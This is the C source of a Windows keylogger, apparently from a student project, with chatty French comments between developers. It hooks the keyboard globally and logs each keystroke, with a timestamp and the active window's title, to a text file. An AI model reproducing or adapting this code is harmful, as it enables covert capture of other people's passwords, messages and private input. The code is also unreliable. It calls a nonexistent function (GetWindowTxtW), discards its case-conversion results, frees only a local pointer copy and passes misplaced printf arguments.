#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>

HHOOK kbd_hook = NULL;
bool capsLock, shift;
FILE *f;
char title[256];
char timestamp[256];
HWND hwnd;
SYSTEMTIME st;
char keyboard_state[256];
wchar_t buf[2];
char *key_pressed;
char  output[256];

void    getKeysState(bool *capsLock, bool *shift) {
    /*
        // Getting the state of the keys in order to know if they are pressed or not.    
    */
    *capsLock = GetKeyState(VK_CAPITAL) & 0x0001;
    *shift = GetAsyncKeyState(VK_SHIFT) & 0x0001;
}

void    handleSpecial(int vkCode, char *key_pressed) {
    /*
        // Attributing a value to all the "special" keys in order to make them readable for the user.
    */
    if (key_pressed)
        free(key_pressed);
    if (vkCode == VK_SPACE)
        key_pressed = strdup("[SPACE]");
    else if (vkCode == VK_RETURN)
        key_pressed = strdup("[ENTER]");
    else if (vkCode == VK_BACK)
        key_pressed = strdup("[BACKSPACE]");
    else if (vkCode == VK_TAB)
        key_pressed = strdup("[TAB]");
    else if (vkCode == VK_ESCAPE)
        key_pressed = strdup("[ESC]");
    else if (vkCode == VK_CAPITAL)
        key_pressed = strdup("[CAPSLOCK]");
    else if (vkCode == VK_SHIFT)
        key_pressed = strdup("[SHIFT]");
    else if (vkCode == VK_LCONTROL)
        key_pressed = strdup("[LEFT CTRL]");
    else if (vkCode == VK_RCONTROL)
        key_pressed = strdup("[RIGHT CTRL]");
}
LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
    /*
        // The hook procedure that will be called every time a key is pressed.

        // The hook procedure is called with the following parameters:
        // code: Specifies whether the hook procedure must process the message.
        // wparam: Specifies whether the key is being pressed or released.
        // lparam: Pointer to a KBDLLHOOKSTRUCT structure.

        // The hook procedure will write on a logfile the current timestamp, the window title and the key pressed.
    */
    if (code < 0)
        return CallNextHookEx(kbd_hook, code, wparam, lparam);

    KBDLLHOOKSTRUCT const *info = (KBDLLHOOKSTRUCT const *)lparam;

    if (info->flags & LLKHF_UP && info->vkCode != VK_CAPITAL 
        || info->flags & LLKHF_UP && info->vkCode != VK_SHIFT)
        return 0;

    if (!(key_pressed = malloc(sizeof(char) * 4)))
        return 0;
    if (info->vkCode == VK_CAPITAL || info->vkCode == VK_SHIFT)
        getKeysState(&capsLock, &shift);
    GetKeyboardState(keyboard_state);
    // printf("vkCode: %d\n", info->vkCode);
    // C'est ici!
    // Pour control il doit retourner 0
    // faut checker les trucs spécial plus tôt.
    // ok j'vais tester ici pour voir mdr -> Ok t'avais raison gg
    // :ok_hand:
    // :monkey_flip:
    // Ok donc ca marchait pas car pour les touches CTRL, alt, etc, on a un buflen de 0 (make sense)
    // C'est grave si on met >= 0 du coup? je pense pas que ce soit grave, faut tester -> okok j'vais tester thx
    // btw effectivement sans les printf ca bug moins dans hookproc mais y'a toujours des ralentissements que je comprends pas
    // je ferais un système de ring buffer quand on aura un truc stable, ça devrait aider.
    // ca marche! J'suis chaud pour qu'on le fasse ensemble car j'en ai jamais fait et c'est interessant comme truc
    // s'tu veux ! Le seul truc tricky là, c'est qu'on va utiliser des threads, et donc des opérations atomiques. C'est vraiment chiant à utiliser correctement.
    // https://en.cppreference.com/w/cpp/atomic/memory_order
    // on va s'amuser
    // :sweat:


    int buf_len = ToUnicodeEx(info->vkCode, info->scanCode, keyboard_state, buf, 2, 0, NULL);
    if (buf_len >= 0)
    {
        buf[buf_len] = 0;
        WideCharToMultiByte(CP_UTF8, 0, buf, -1, key_pressed, 4, NULL, NULL);
        if (info->vkCode == VK_SPACE || info->vkCode == VK_RETURN || info->vkCode == VK_BACK 
            || info->vkCode == VK_TAB || info->vkCode == VK_ESCAPE || info->vkCode == VK_LCONTROL
            || info->vkCode == VK_RCONTROL || info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT)
            handleSpecial(info->vkCode, key_pressed);

        if (capsLock && !shift || !capsLock && shift)
            toupper(key_pressed[0]);
        else if (capsLock && shift || !capsLock && !shift)
            tolower(key_pressed[0]);
        
        GetLocalTime(&st);
        sprintf(timestamp, "%02d:%02d:%02d.%03d", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
        hwnd = GetForegroundWindow();
        // GetWindowTextA(hwnd, title, 256); // ici // oki merci

        GetWindowTxtW(hwnd, title, 256);
        sprintf(output, "[%s] <%s> => %s\n", timestamp, title, key_pressed);
        fwrite(output, 1, strlen(output), f);
        fflush(f);
    }

    return 0;
}

int main(void) {
    HINSTANCE hInstance = GetModuleHandleW(NULL);

    f = fopen("C:\\Users\\Buste\\Documents\\GitHub\\tinky-winkey\\log.txt", "w");
    kbd_hook = SetWindowsHookExW(WH_KEYBOARD_LL, hookproc, hInstance, 0);
    if (!kbd_hook)
        return (printf("hook installation failed: %d\n", GetLastError(), 1));

    MSG msg;
    getKeysState(&capsLock, &shift);
    GetMessageW(&msg, NULL, 0, 0);
}